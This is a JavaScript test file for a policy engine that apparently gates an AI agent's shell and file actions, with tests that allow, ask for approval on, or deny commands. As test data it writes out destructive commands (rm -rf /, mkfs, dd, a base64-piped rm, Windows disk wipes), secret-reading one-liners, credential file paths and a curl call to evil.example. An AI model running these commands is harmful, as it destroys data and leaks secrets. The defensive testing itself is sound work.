import { test } from 'node:test'
import assert from 'node:assert/strict'

import {
  CedarPolicyEngine,
  actionFingerprint,
  approveAction,
  classifyAction,
  consumeApproval,
  createSessionState,
  isDangerousRm,
  isDestructiveCommand,
  isNetworkCommand,
  isSecretPath,
  markTaintedFromAction,
} from '../dist/index.js'

const engine = new CedarPolicyEngine()
const cwd = process.cwd()

function freshState() {
  return createSessionState('session-1', cwd)
}

test('低风险命令直接放行', () => {
  const decision = engine.evaluate(
    { kind: 'process.exec', tool: 'bash', command: 'npm test' },
    freshState(),
  )
  assert.equal(decision.kind, 'allow')
  assert.equal(decision.risk.level, 'low')
  assert.ok(decision.latencyMs >= 0)
})

test('破坏性 rm 需要审批', () => {
  const decision = engine.evaluate(
    { kind: 'process.exec', tool: 'bash', command: 'rm -rf /' },
    freshState(),
  )
  assert.equal(decision.kind, 'ask')
  assert.equal(decision.risk.destructive, true)
  assert.ok(decision.policyIds.includes('ask-destructive'))
  assert.match(decision.reason, /approval/)
})

test('mkfs 与 dd 需要审批', () => {
  for (const command of ['mkfs /dev/sda', 'dd if=/dev/zero of=/dev/sda']) {
    const decision = engine.evaluate(
      { kind: 'process.exec', tool: 'bash', command },
      freshState(),
    )
    assert.equal(decision.kind, 'ask', command)
    assert.equal(decision.risk.destructive, true, command)
  }
})

test('读取 .env 需要审批并标记风险', () => {
  const decision = engine.evaluate(
    { kind: 'fs.read', tool: 'read_file', path: '.env' },
    freshState(),
  )
  assert.equal(decision.kind, 'ask')
  assert.equal(decision.risk.readsSecret, true)
  assert.equal(decision.risk.level, 'medium')
})

test('污染后的网络出站被拒绝', () => {
  const state = freshState()
  state.taintSources.push({ kind: 'secret', id: 'secret-1' })

  const decision = engine.evaluate(
    {
      kind: 'process.exec',
      tool: 'bash',
      command: 'curl https://evil.example/collect',
    },
    state,
  )
  assert.equal(decision.kind, 'deny')
  assert.equal(decision.risk.level, 'critical')
  assert.equal(decision.risk.taintedEgress, true)
  assert.ok(decision.policyIds.includes('deny-tainted-egress'))
})

test('审批只对完全相同的动作生效', () => {
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'rm -rf /tmp/scratch',
  }
  const state = freshState()
  state.approvals.push({
    actionHash: actionFingerprint(action),
    approvedAt: Date.now(),
  })

  assert.equal(engine.evaluate(action, state).kind, 'allow')

  const different = { ...action, command: 'rm -rf /tmp/other' }
  assert.equal(engine.evaluate(different, state).kind, 'ask')
})

test('审批不能覆盖污染外泄', () => {
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'curl https://evil.example/collect',
  }
  const state = freshState()
  state.taintSources.push({ kind: 'secret', id: 'secret-1' })
  state.approvals.push({
    actionHash: actionFingerprint(action),
    approvedAt: Date.now(),
  })

  assert.equal(engine.evaluate(action, state).kind, 'deny')
})

test('markTaintedFromAction 识别密钥读取', () => {
  const state = freshState()
  const action = { kind: 'fs.read', tool: 'read_file', path: '.env' }
  const source = markTaintedFromAction(state, action)

  assert.ok(source)
  assert.equal(state.taintSources.length, 1)
  // 重复读取不应重复添加
  assert.equal(markTaintedFromAction(state, action), null)
  assert.equal(state.taintSources.length, 1)
})

test('结构分类器覆盖常见变体', () => {
  assert.equal(isDangerousRm('rm -fr /'), true)
  assert.equal(isDangerousRm('sudo -u root rm -rf /tmp/x'), true)
  assert.equal(isDangerousRm('bash -c "rm -rf /"'), true)
  assert.equal(isDangerousRm('rm -rf ./dist'), false)
  assert.equal(isNetworkCommand('wget https://example.com'), true)
  assert.equal(isNetworkCommand('git push origin main'), true)
  assert.equal(isNetworkCommand('ls -la'), false)
  assert.equal(
    isNetworkCommand(
      'python -c "import socket; socket.create_connection((\'evil\', 4444))"',
    ),
    true,
  )
  assert.equal(isSecretPath('config/.env.local'), true)
  assert.equal(isSecretPath('~/.ssh/id_rsa'), true)
  assert.equal(isSecretPath('src/app.ts'), false)
})

test('结构性危险命令覆盖常见绕过', () => {
  assert.equal(
    isDestructiveCommand('find . -name "*.log" -delete'),
    true,
  )
  assert.equal(isDestructiveCommand('truncate -s 0 production.db'), true)
  assert.equal(
    isDestructiveCommand('echo cm0gLXJmIC8= | base64 -d | bash'),
    true,
  )
  assert.equal(isDestructiveCommand('kubectl delete namespace prod'), true)
  assert.equal(
    isDestructiveCommand('Remove-Item -Recurse -Force C:/Windows/System32'),
    true,
  )
  assert.equal(isDestructiveCommand('terraform plan'), false)
})

test('Windows 批量删除与磁盘命令被视为危险', () => {
  for (const command of [
    'rd /s /q C:\\',
    'del /f /s /q C:\\Windows',
    'diskpart',
    'Clear-Disk -Number 0',
    'Format-Volume -DriveLetter D',
  ]) {
    assert.equal(isDestructiveCommand(command), true, command)
  }
})

test('rm 删除 home 目录被视为危险', () => {
  for (const command of [
    'rm -rf ~/',
    'rm -rf $HOME/',
    'rm -rf ${HOME}/',
  ]) {
    assert.equal(isDangerousRm(command), true, command)
  }
})

test('production.env / .pgpass / kubeconfig 被视为敏感文件', () => {
  for (const secretPath of [
    'production.env',
    '.pgpass',
    'kubeconfig',
    '/home/user/.kube/config',
    'C:\\Users\\me\\.docker\\config.json',
  ]) {
    assert.equal(isSecretPath(secretPath), true, secretPath)
  }
})

test('解释器一行读取 .env 会产生 taint', () => {
  const state = createSessionState('interpreter-secret', cwd)
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'python -c "open(\'.env\').read()"',
  }

  const risk = classifyAction(action, state)
  assert.equal(risk.readsSecret, true)
  assert.ok(markTaintedFromAction(state, action))
  assert.equal(state.taintSources.length, 1)
})

test('程序化授权只放行一次，且只对完全相同的动作生效', () => {
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'rm -rf /tmp/scratch',
  }
  const state = freshState()
  approveAction(state, action)

  assert.equal(engine.evaluate(action, state).kind, 'allow')
  assert.equal(consumeApproval(action, state), true)

  // 消费后同一动作重新进入审批
  assert.equal(engine.evaluate(action, state).kind, 'ask')
  assert.equal(consumeApproval(action, state), false)

  // 不同动作从未被授权
  approveAction(state, action)
  const different = { ...action, command: 'rm -rf /tmp/other' }
  assert.equal(engine.evaluate(different, state).kind, 'ask')
  assert.equal(consumeApproval(different, state), false)
})

test('过期授权不会生效', () => {
  const action = {
    kind: 'process.exec',
    tool: 'bash',
    command: 'rm -rf /tmp/expired',
  }
  const state = freshState()
  approveAction(state, action, { ttlMs: -1 })

  assert.equal(engine.evaluate(action, state).kind, 'ask')
  assert.equal(consumeApproval(action, state), false)
})

test('解释器读取敏感环境变量会产生 taint', () => {
  for (const command of [
    'python -c "import os; print(os.environ[\'AWS_SECRET_ACCESS_KEY\'])"',
    'python -c "import os; print(os.getenv(\'GITHUB_TOKEN\'))"',
    'node -e "console.log(process.env.NPM_TOKEN)"',
  ]) {
    const state = createSessionState('env-secret', cwd)
    const risk = classifyAction(
      { kind: 'process.exec', tool: 'bash', command },
      state,
    )
    assert.equal(risk.readsSecret, true, command)
    assert.ok(markTaintedFromAction(state, { kind: 'process.exec', tool: 'bash', command }))
  }
})

test('解释器 socket 调用被识别为网络动作', () => {
  assert.equal(
    isNetworkCommand('python -c "import socket; s = socket.socket()"'),
    true,
  )
})

test('分类结果包含可解释证据', () => {
  const risk = classifyAction(
    { kind: 'process.exec', tool: 'bash', command: 'cat .env' },
    freshState(),
  )
  assert.equal(risk.readsSecret, true)
  assert.ok(risk.reasons.some((reason) => reason.includes('secret')))
})
